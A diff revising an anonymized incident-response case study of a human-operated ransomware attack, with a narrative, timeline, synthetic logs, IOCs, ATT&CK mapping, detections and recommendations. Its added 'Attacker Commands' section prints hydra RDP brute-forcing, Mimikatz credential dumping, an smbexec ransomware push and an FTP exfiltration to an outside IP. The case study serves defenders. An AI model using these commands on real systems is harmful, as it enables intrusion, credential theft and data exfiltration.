@@ -1,13 +1,13 @@
-# 🛡 Demo Case: Human-Operated Ransomware (Anonymized)
+🛡 Human-Operated Ransomware (Anonymized)
+📌 Executive Summary
 
-## 📌 Executive Summary
-This case describes a **multi-stage ransomware incident**.  
-The attacker gained access via an exposed **RDP service**, escalated to domain admin, moved laterally with **Cobalt Strike**, and deployed ransomware domain-wide through **Group Policy**.  
-They also exfiltrated sensitive files before encryption.  
+This case describes a multi-stage ransomware incident.
+The attacker gained access via an exposed RDP service, escalated to domain admin, moved laterally with Cobalt Strike, and deployed ransomware domain-wide through Group Policy.
+They also exfiltrated sensitive files before encryption.
 
-**🎯 Outcome:** confirmed data exfiltration, ransomware deployment at scale, and delayed detection.
+🎯 Outcome: confirmed data exfiltration, ransomware deployment at scale, and delayed detection.
 
----
+____________________________________________________________________________________________
 
 ## 🖼 Attack Flow (ASCII Diagram)
 
@@ -57,69 +57,180 @@ They also exfiltrated sensitive files before encryption.
    | 🔒 Endpoints Encrypted    |
    +---------------------------+
 
-## 📖 Attack Narrative
+____________________________________________________________________________________________
 
-### Stage 1 – Initial Access & Escalation
-- 🔴 **RDP brute-force** → successful login.  
-- 🟡 **Privilege escalation** via DLL hijack + LSASS dump (Mimikatz).  
-- 🟡 Domain admin credentials harvested.  
+📖 Attack Narrative
 
-### Stage 2 – Lateral Movement & Recon
-- 🔴 **Cobalt Strike beacon** deployed for C2.  
-- 🟡 SMB shares + stolen creds used for pivot.  
-- 🟢 **PowerView** run for domain reconnaissance.  
+🥷 Stage 1 – Initial Access & Escalation
 
-### Stage 3 – Ransomware Deployment & Exfiltration
-- 🔴 **Group Policy** modified to push ransomware.  
-- 🔴 **Sensitive files exfiltrated via FTP**.  
-- 🔴 **Encryption triggered** → ransom notes deployed.  
+🔴 RDP brute-force → successful login to exposed server.
 
----
+🟡 LSASS dump with Mimikatz recovered cached domain admin creds.
 
-## ⏱️ Timeline (UTC)
+🟡 Attacker used DLL hijack for persistence on initial host.
 
-| Time   | Event                                      |
-|--------|--------------------------------------------|
-| T0     | 🔴 RDP brute-force success                 |
-| +1 hr  | 🟡 LSASS dump → admin creds harvested       |
-| +2 hr  | 🔴 Cobalt Strike beacon active              |
-| +4 hr  | 🔴 GPO used to deploy ransomware            |
-| +5 hr  | 🔴 Data exfiltration via FTP                |
-| +6 hr  | 🔴 Ransomware execution, ransom dropped     |
 
----
+🛠 Stage 2 – Lateral Movement & Recon
 
-## 🔑 Key Findings
-- 🔴 Exposed RDP allowed stealthy entry.  
-- 🟡 Privilege escalation → domain admin compromise.  
-- 🔴 Ransomware distributed via Group Policy.  
-- 🔴 Data exfiltration confirmed before encryption.  
-- 🟡 Detection & response were delayed.  
+🔴 Cobalt Strike beacon deployed for C2.
 
----
+🟡 Lateral movement via SMB + stolen credentials.
 
-## 🗂️ MITRE ATT&CK Mapping
-- **T1210** – Exploitation of Remote Services (RDP)  
-- **T1003** – OS Credential Dumping (LSASS / Mimikatz)  
-- **T1071.001** – Application Layer Protocol (Cobalt Strike C2)  
-- **T1486** – Data Encrypted for Impact (Ransomware)  
-- **T1020** – Automated Exfiltration (FTP)  
-- **T1069** – Permission Group Discovery (PowerView)  
+🟢 Recon with PowerView and net group "Domain Admins".
 
----
 
-## 👀 Detection Use Cases
-- 🚨 Alert on unusual external RDP logins.  
-- 🟡 Detect LSASS memory access (Mimikatz-like behavior).  
-- 🔴 Monitor **Group Policy changes** outside maintenance windows.  
-- 🔴 Outbound FTP transfers to unknown hosts.  
-- 🔴 Mass file access & encryption behavior at endpoints.  
+💥 Stage 3 – Ransomware Deployment & Exfiltration
 
----
+🔴 Group Policy Object (GPO) modified to push ransomware binary.
 
-## 🛡️ Recommendations
-- Block or restrict RDP; enforce MFA.  
-- Harden LSASS against credential dumping.  
-- Audit & alert on GPO modifications.  
-- Monitor outbound traffic for exfiltration.  
-- Deploy ransomware-specific detections in SIEM/EDR.  
+🟢 Exfiltration of sensitive finance files via FTP.
+
+🔒 Ransomware executed → encrypted endpoints, ransom note deployed.
+
+____________________________________________________________________________________________
+
+⏱️ Timeline (UTC)
+Time	Event
+00:00	🔴 RDP brute-force successful login
+01:05	🟡 LSASS dump performed, creds extracted
+01:45	🔴 Cobalt Strike beacon active
+03:20	🟢 Recon with PowerView + domain map created
+04:00	🔴 Group Policy modified → ransomware distributed
+04:20	🟢 FTP session opened, ~3GB data exfiltrated
+06:00	🔒 Ransomware executed across endpoints
+
+____________________________________________________________________________________________
+
+📂 Artifacts (Synthetic / Anonymized)
+
+Windows Security Log (Event ID 4624 – RDP Login):
+
+{
+  "time": "2025-06-10T00:00:11Z",
+  "eventID": 4624,
+  "targetUser": "Administrator",
+  "logonType": 10,
+  "srcIP": "185.203.55.77",
+  "workstation": "SRV-RDP01"
+}
+
+Sysmon LSASS Dump Detection:
+
+{
+  "time": "2025-06-10T01:05:31Z",
+  "eventSource": "Sysmon",
+  "process": "mimikatz.exe",
+  "target": "lsass.exe",
+  "action": "memory dump"
+}
+
+FTP Exfiltration Log:
+
+{
+  "time": "2025-06-10T04:21:12Z",
+  "protocol": "FTP",
+  "srcHost": "DC01.internal.local",
+  "dstIP": "91.214.44.91",
+  "filesTransferred": "Finance_Q2_2025.zip (2.9GB)"
+}
+
+Ransom Note (sample content):
+
+Your files are encrypted.
+Contact us at: darkteam@onionmail.org
+BTC wallet: 1C5smT3pB2k4...
+
+____________________________________________________________________________________________
+
+💻 Attacker Commands (Reconstructed, Synthetic)
+
+# Brute-force RDP (attacker side)
+hydra -l administrator -P rockyou.txt rdp://victim.company.com
+
+# LSASS dump with Mimikatz
+mimikatz.exe "sekurlsa::logonpasswords"
+
+# Reconnaissance
+powershell -exec bypass -c "Import-Module .\PowerView.ps1; Get-NetDomainTrust"
+
+# Deploy ransomware via GPO
+smbexec.py corp/admin:Password123@DC01 cmd.exe /c "\\share\ransom.exe"
+
+# Exfiltration
+ftp -inv 91.214.44.91 <<EOF
+put Finance_Q2_2025.zip
+EOF
+
+____________________________________________________________________________________________
+
+🧾 IOCs (Synthetic)
+
+| Type      | Value                                                   | Source         | Status    |
+| --------- | ------------------------------------------------------- | -------------- | --------- |
+| 🌐 IP     | 185.203.55.77                                           | RDP logon      | Malicious |
+| 🌐 IP     | 91.214.44.91                                            | FTP exfil      | Malicious |
+| 🛠 Binary | mimikatz.exe (SHA256: a1b2c3…)                          | Sysmon logs    | Malicious |
+| 🛠 Binary | ransomware.exe (SHA256: d4e5f6…)                        | GPO deployment | Malicious |
+| 📧 Email  | [darkteam@onionmail.org](mailto:darkteam@onionmail.org) | Ransom note    | Malicious |
+
+____________________________________________________________________________________________
+
+🗂️ MITRE ATT&CK Mapping
+
+T1210 – Exploitation of Remote Services (RDP)
+
+T1003 – OS Credential Dumping (LSASS / Mimikatz)
+
+T1071.001 – Application Layer Protocol (Cobalt Strike C2)
+
+T1069 – Permission Group Discovery (PowerView)
+
+T1486 – Data Encrypted for Impact (Ransomware)
+
+T1020 – Automated Exfiltration (FTP)
+
+____________________________________________________________________________________________
+
+👀 Detection Use Cases
+
+🚨 Alert on external RDP logins with unusual geolocation.
+
+🚨 Monitor LSASS access events (EDR / Sysmon).
+
+🚨 Detect Cobalt Strike beacon IOCs (named pipes, SMB traffic).
+
+🚨 Audit & alert on GPO modifications outside change window.
+
+🚨 Detect outbound FTP traffic to rare destinations.
+
+🚨 Alert on mass file access + rapid encryption.
+
+____________________________________________________________________________________________
+
+🛡️ Response Actions
+
+❌ Disabled compromised accounts.
+
+🔒 Blocked malicious RDP access at firewall.
+
+🛑 Stopped GPO ransomware push, revoked domain admin tokens.
+
+📑 Performed forensic imaging of DC + endpoints.
+
+📢 Communicated incident impact to leadership.
+
+____________________________________________________________________________________________
+
+🛡️ Recommendations
+
+Block or restrict RDP; enforce MFA for admins.
+
+Harden LSASS (Credential Guard, Protected Process Light).
+
+Audit & alert on Group Policy changes.
+
+Monitor outbound data exfiltration attempts.
+
+Deploy ransomware-specific behavioral detections in SIEM/EDR.
+
+Perform regular tabletop exercises for ransomware IR.
